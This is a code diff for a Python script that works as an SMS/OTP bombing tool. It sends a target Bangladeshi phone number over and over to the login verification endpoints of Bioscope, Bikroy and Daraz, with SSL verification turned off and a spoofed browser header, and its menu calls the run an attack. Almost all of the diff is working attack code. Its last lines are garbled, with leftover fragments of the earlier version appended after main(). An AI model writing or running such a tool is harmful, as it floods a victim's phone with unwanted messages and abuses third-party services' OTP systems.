@@ -1,18 +1,19 @@
 # working_sms_sender_bd.py
 import requests
-import json
 import time
 import random
 import threading
-from concurrent.futures import ThreadPoolExecutor
 import logging
-from urllib3.util.retry import Retry
-from requests.adapters import HTTPAdapter
+import re
+import urllib3
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Configure logging
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(message)s',
     handlers=[
         logging.FileHandler('sms_sender.log', encoding='utf-8'),
         logging.StreamHandler()
@@ -21,20 +22,224 @@ logging.basicConfig(
 
 class WorkingBangladeshiSMSSender:
     def __init__(self):
-        # Setup session with retry strategy
         self.session = requests.Session()
         
-        # Retry strategy
-        retry_strategy = Retry(
-            total=3,
-            status_forcelist=[429, 500, 502, 503, 504],
-            allowed_methods=["GET", "POST"],
-            backoff_factor=1
-        )
+        # Setup session headers
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json'
+        })
         
-        adapter = HTTPAdapter(max_retries=retry_strategy)
-        self.session.mount("http://", adapter)
-        self.session.mount("https://", adapter)
+        # Working Bangladeshi APIs
+        self.apis = [
+            {
+                'name': 'Bioscope',
+                'url': 'https://api.staging.bioscopelive.com/v2/auth/login',
+                'method': 'POST',
+                'payload': {
+                    "number": "+88{phone}",
+                    "country": "BD", 
+                    "platform": "web",
+                    "language": "en"
+                },
+                'headers': {
+                    'Content-Type': 'application/json'
+                }
+            },
+            {
+                'name': 'Bikroy',
+                'url': 'https://bikroy.com/data/phone_number_login/verifications/phone_login',
+                'method': 'POST',
+                'payload': {"phone": "{phone}"},
+                'headers': {
+                    'Content-Type': 'application/json'
+                }
+            },
+            {
+                'name': 'Daraz OTP',
+                'url': 'https://my.daraz.com.bd/gw/member-account/otp/send',
+                'method': 'POST',
+                'payload': {
+                    "phone": "{phone}",
+                    "phoneCode": "+88",
+                    "scene": "LOGIN_OR_REGISTER"
+                },
+                'headers': {
+                    'Content-Type': 'application/json'
+                }
+            }
+        ]
+    
+    def validate_bangladeshi_phone(self, phone):
+        pattern = r'^(\+88|88)?(01[3-9]\d{8})$'
+        return bool(re.match(pattern, phone))
+    
+    def format_phone(self, phone):
+        if phone.startswith('+88'):
+            return phone[3:]
+        elif phone.startswith('88'):
+            return phone[2:]
+        return phone
+    
+    def send_single_sms(self, api_config, phone):
+        try:
+            formatted_phone = self.format_phone(phone)
+            url = api_config['url']
+            method = api_config['method']
+            headers = api_config.get('headers', {})
+            payload = api_config['payload']
+            
+            formatted_payload = {}
+            for key, value in payload.items():
+                if isinstance(value, str):
+                    formatted_payload[key] = value.format(phone=formatted_phone)
+                else:
+                    formatted_payload[key] = value
+            
+            print(f"Sending to {api_config['name']}...")
+            
+            if method.upper() == 'POST':
+                response = self.session.post(
+                    url,
+                    json=formatted_payload,
+                    headers=headers,
+                    timeout=15,
+                    verify=False
+                )
+            else:
+                response = self.session.get(
+                    url,
+                    params=formatted_payload,
+                    headers=headers,
+                    timeout=15,
+                    verify=False
+                )
+            
+            if response.status_code in [200, 201, 202]:
+                return {
+                    'success': True,
+                    'api_name': api_config['name'],
+                    'status_code': response.status_code,
+                    'message': f"SUCCESS: {api_config['name']}"
+                }
+            else:
+                return {
+                    'success': False,
+                    'api_name': api_config['name'],
+                    'status_code': response.status_code,
+                    'message': f"FAILED: {api_config['name']} (Status: {response.status_code})"
+                }
+                
+        except Exception as e:
+            return {
+                'success': False,
+                'api_name': api_config['name'],
+                'error': str(e),
+                'message': f"ERROR: {api_config['name']} - {str(e)}"
+            }
+    
+    def send_bulk_sms(self, phone, count=10, delay=3.0):
+        if not self.validate_bangladeshi_phone(phone):
+            return {'success': False, 'message': 'Invalid Bangladeshi phone number'}
+        
+        results = []
+        successful_count = 0
+        
+        print(f"Starting bulk SMS to {phone} - Count: {count}")
+        
+        for i in range(count):
+            api_config = self.apis[i % len(self.apis)]
+            
+            print(f"Attempt {i+1}/{count} - {api_config['name']}")
+            
+            result = self.send_single_sms(api_config, phone)
+            results.append(result)
+            
+            if result['success']:
+                successful_count += 1
+                print(f"✅ {api_config['name']} - SUCCESS")
+            else:
+                print(f"❌ {api_config['name']} - FAILED")
+            
+            if i < count - 1:
+                time.sleep(delay)
+        
+        success_rate = (successful_count / count) * 100
+        
+        summary = {
+            'success': successful_count > 0,
+            'total_attempts': count,
+            'successful_attempts': successful_count,
+            'failed_attempts': count - successful_count,
+            'success_rate': success_rate
+        }
+        
+        print(f"Completed: {successful_count}/{count} successful ({success_rate:.1f}%)")
+        return summary
+
+def main():
+    print("=" * 50)
+    print("🇧🇩 BANGLADESHI SMS SENDER")
+    print("=" * 50)
+    
+    sender = WorkingBangladeshiSMSSender()
+    
+    while True:
+        print("\nOptions:")
+        print("1. Send Bulk SMS")
+        print("2. Test Single SMS")
+        print("3. Exit")
+        
+        choice = input("\nSelect option (1-3): ").strip()
+        
+        if choice == '1':
+            phone = input("Enter phone number (01712345678): ").strip()
+            if sender.validate_bangladeshi_phone(phone):
+                count = input("Number of SMS to send (default 10): ").strip()
+                count = int(count) if count else 10
+                
+                delay = input("Delay between SMS in seconds (default 3): ").strip()
+                delay = float(delay) if delay else 3.0
+                
+                print(f"\nStarting attack on {phone}...")
+                result = sender.send_bulk_sms(phone, count, delay)
+                
+                print(f"\nResults:")
+                print(f"Successful: {result['successful_attempts']}")
+                print(f"Failed: {result['failed_attempts']}")
+                print(f"Success Rate: {result['success_rate']:.1f}%")
+            else:
+                print("Invalid Bangladeshi phone number!")
+        
+        elif choice == '2':
+            phone = input("Enter phone number (01712345678): ").strip()
+            if sender.validate_bangladeshi_phone(phone):
+                print("\nAvailable APIs:")
+                for i, api in enumerate(sender.apis, 1):
+                    print(f"{i}. {api['name']}")
+                
+                try:
+                    api_choice = int(input(f"Select API (1-{len(sender.apis)}): ")) - 1
+                    if 0 <= api_choice < len(sender.apis):
+                        result = sender.send_single_sms(sender.apis[api_choice], phone)
+                        print(f"\nResult: {result['message']}")
+                    else:
+                        print("Invalid selection")
+                except:
+                    print("Invalid input")
+            else:
+                print("Invalid phone number!")
+        
+        elif choice == '3':
+            print("Goodbye!")
+            break
+        
+        else:
+            print("Invalid option!")
+
+if __name__ == "__main__":
+    main()        self.session.mount("https://", adapter)
         
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
